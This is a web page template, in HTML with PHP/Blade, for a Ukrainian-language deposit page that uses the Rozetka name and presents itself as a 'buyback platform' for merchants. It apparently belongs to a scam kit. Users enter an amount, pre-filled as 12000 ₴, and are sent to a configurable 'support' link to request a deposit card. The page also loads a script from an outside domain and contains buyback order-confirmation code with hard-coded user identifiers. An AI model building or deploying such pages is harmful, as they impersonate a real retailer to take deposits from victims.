<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" class="pixel-ratio-2 retina">

<head>
	<style>
		:root {

			--image-path: url('<?php echo asset("/assets/foot_nav.png") ?>');
			--image-path2: url('<?php echo asset("/assets/dd_icon.png") ?>');
		}
	</style>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
	<title>зараз депозит - Rozetka</title>
	<meta name="keywords" content="Платформа зворотного викупу для українських торговців">
	<meta name="description" content="Колекції жіночого, чоловічого та дитячого одягу, взуття, а також товари для дому та спорту. Інформація про доставку та оплату. Таблиці розмірів, поради по догляду за речами.">
	<meta name="format-detection" content="telephone=no">
	<link rel="shortcut icon" type="image/ico" href="<?php echo asset("assets/favicon.ico") ?>">
	<link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style.css") ?>">
	<script type="text/javascript" src="<?php echo asset("assets/jquery.js") ?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/global.js") ?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/arttpl.js") ?>"></script>
	<link href="<?php echo asset("assets/layer.css") ?>" type="text/css" rel="styleSheet" id="layermcss">
</head>

<body>
	<div class="pagetop">
		<div class="fh"><a href="javascript:history.back(-1)"></a></div>
		<div>зараз депозит</div>
		<!-- <div class="cd"><a href="javascript:top_menu();"></a></div> -->
		<!-- 
<div class="top_menu" id="top_menu">
	<ul>
	<li><a href="<?php echo route("index") ?>"><i class="top_tb1"></i><span>Головна</span></a></li>
	<li><a href="https://wbbff.cc/index.php/category/list"><i class="top_tb2"></i><span>Каталог</span></a></li>
	<li><a href="<?php echo route("cart") ?>"><i class="top_tb3"></i><span>Кошик</span></a></li>
	<li><a href="<?php echo route("profile") ?>"><i class="top_tb4"></i><span>Профіль</span></a></li>
	</ul>
	<div class="clear"></div>
</div> -->
	</div>
	<form method="post" id="form">
		<div class="content">
			<div class="zc_box2 mat10">
				<div class="zc_list">
					<div class="zc_name">баланс</div>
					<div class="zc_text"><span class="num strong corg">{{ Auth::user()->balance }}</span> ₴.</div>
				</div>
				<div class="zc_list">
					<div class="zc_name">кількість</div>
					<div class="zc_text"><input type="text" name="order_money" placeholder="введіть суму вкладу" value="12000"></div>
				</div>
				<!-- 		<div class="zc_list">
			<div class="zc_name"></div>
			<div class="zc_text" id="payment_btn">банківський переказ</div>
			<i class="jt_r"></i>
		</div>  -->
			</div>
			<div class="loginbtn" style="margin:15px 12px;">
				<input type="button" value="Відправити">
				<input type="hidden" name="pe_token" value="75236c7c5fdf7ebfe3441c02863d0cb8">
				<input type="hidden" name="pesubmit">
			</div>
			

		</div>
		<div id="page_payment" class="divhide">
			<div class="add_tt">Виберіть спосіб оплати</div>
			<div class="close_btn" onclick="app_page_close();"></div>
			<div>
			</div>
		</div>
		<div id="htmlbank" style="display:none;">
			<div class="bank_text"></div>
		</div>
	</form>
	<script type="text/javascript" src="<?php echo asset("assets/wechat.js") ?>"></script>
	<script type="text/javascript">
		function addchongzhi(order_money) {
			$.ajax({
				url: "/user.php?mod=pay&act=addchongzhi&user_id=11769&order_money=" + order_money + "&order_name=Ivan223",
				success: function(result) {

				}
			});
		}

		$(function() {
			//спосіб оплати
			// pe_select_radio('order_payment', $(":input[name='order_payment']:eq(1)").val(), function(json){
			// 	$("#payment_btn").html($(":input[name='order_payment']:checked").attr("payment_name"));
			// 	app_page_close();
			// });
			$(":button").click(function() {
				var order_payment = $(":input[name='order_payment']:checked").val();
				var order_money = pe_num($(":input[name='order_money']").val(), 'floor', 1);
				if (order_money < 0.1) {
					app_tip("Мінімальний ліміт депозиту：0.1");
					return false;
				} else {

				}

				layer.open({
					type: 4,
					title: "Поповнити баланс",
					area: ['300px', '350px'],
					fixed: false, //не фіксований
					shadeClose: true,
					shade: 0.5,
					content: "Визначити суму депозиту і звернутися до служби підтримки для запиту депозитної картки?",
					btn: ["Перейти до", "Скасувати"],
					yes: function(index, layero) {
						addchongzhi(order_money);
						window.location.href = "{{ $settings->linkManager }}";
						
					},
					cancel: function(index, layero) {
						layer.close(index);
					}
				});
				// app_submit("<?php echo route("deposit") ?>", function(json){
				// 	if (json.result) {
				// 		if(order_payment == 'wechat') {
				// 			wx_pay(json.id);
				// 		}
				// 		else {
				// 			app_open(json.url, 1000);
				// 		}
				// 	}
				// })
			})
		})
	</script>
	<link rel="stylesheet" href="<?php echo asset("assets/weui.min.css") ?>">
	<link rel="stylesheet" href="<?php echo asset("assets/jquery-weui.min.css") ?>">
	<script src="<?php echo asset("assets/jquery-weui.js") ?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/layer.js") ?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/app.js") ?>"></script>
	<script type="text/javascript">
		//клік верхнього меню
		function top_menu() {
			if ($("#top_menu").is(":hidden")) {
				$("#top_menu").show();
			} else {
				$("#top_menu").hide();
			}
			$("#top_menu a").live("click", function() {
				$("#top_menu").hide();
			})
		}
		pe_loadscript("https://wbbff.cc/api.php?mod=cron");
	</script>
	<script>
		function confirm_huigou(order_id) {
			layer.open({
				content: "Визначити викуп цього Замовлення？",
				btn: ["OK", "Скасувати"],
				shadeClose: false,
				yes: function() {

					/*layer.open({
						content: 'ви натиснули підтвердити',
						time: 1
					});*/
					$.ajax({
						type: "POST",
						url: "./user.php?mod=order&act=huigou_do",
						dataType: "json",
						data: {
							'order_id': order_id,
						},
						success: function(res) {
							console.log(res);

							if (res.result == false) {
								layer.open({
									content: res.msg,
									time: 3,
									skin: 'msg',
									end: function() {
										location.href = './user.php?mod=userbank';
									}
								});
							} else {
								layer.open({
									content: res.msg,
									time: 2,
									skin: 'msg',
									end: function() {
										location.reload();
									}
								});
							}
						}
					});
				}

			});
		}
	</script>

	
</body>

</html>